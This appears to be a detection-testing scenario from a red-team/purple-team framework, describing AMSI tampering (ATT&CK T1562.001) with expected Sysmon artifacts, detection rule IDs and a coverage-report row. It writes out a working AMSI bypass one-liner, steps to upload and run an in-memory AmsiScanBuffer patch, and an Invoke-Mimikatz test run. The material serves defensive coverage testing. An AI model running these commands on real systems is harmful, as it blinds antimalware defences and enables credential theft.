# SC-06 — AMSI patching (evasion procedure)

**ATT&CK:** T1562.001 (Impair Defenses: Disable or Modify Tools — AMSI)

## Objective

Run the public AMSI-tampering atomics **through the framework shell**
and grade what each variant leaves visible. The implant never touches
AMSI itself — this is a documented procedure, and its honest telemetry
boundary is the takeaway (playbook: `detections/playbooks/T1562.001-amsi-patching.md`).

## Prerequisites

- Interactive shell with powershell available (agent reports it at
  checkin: `info`).
- Baseline first: confirm a normal powershell run lands in your
  telemetry (SC-01 covers this).

## Procedure (operator console)

Variant A — the visible one (string flag):

```
interact <session-prefix>
exec powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
```

Variant B — the quiet one (in-memory `AmsiScanBuffer` patch via a
public public-domain script, e.g. Rasta Mouse's):

```
upload /tmp/amsi.ps1 C:\\labs\amsi.ps1
shell
powershell -ep bypass -c Import-Module C:\\labs\amsi.ps1; Disable-Amsi
powershell -c "Invoke-Mimikatz -Command exit"   # sample: something AMSI would normally flag
back
```

(Provide `amsi.ps1` from the public atomic; it is deliberately not
shipped in this repo.)

## Expected host artifacts

- EID 1: powershell command line with the `AmsiUtils`/`amsiInitFailed`
  strings (variant A) — Sysmon sees this.
- EID 11: `amsi.ps1` upload (`.rat-upload-*` spool + rename).
- Variant B's patch itself: **invisible to classic Sysmon** — EDR hook
  integrity / ETW-TI only. Write down what your stack actually saw.

## Expected detections

- `513c2ae7-9f96-408b-8697-99ed4b0f2d2a` (amsi-tampering-indicators)
  on variant A.
- `13bbd85b-a3c5-4bb2-9afc-be03d28a1e45` (transfer spool) for the
  script upload.
- EDR AMSI-tamper analytics on variant B — the "EDR-only" row of the
  coverage report.

## Cleanup

Shell: `del C:\\labs\amsi.ps1`. Note the variant-B effect is
per-process — new shells are clean again.

## Coverage-report row

```
SC-06 | AMSI patching | T1562.001 | exercised | detections: <fired / EDR-only / missed>
```
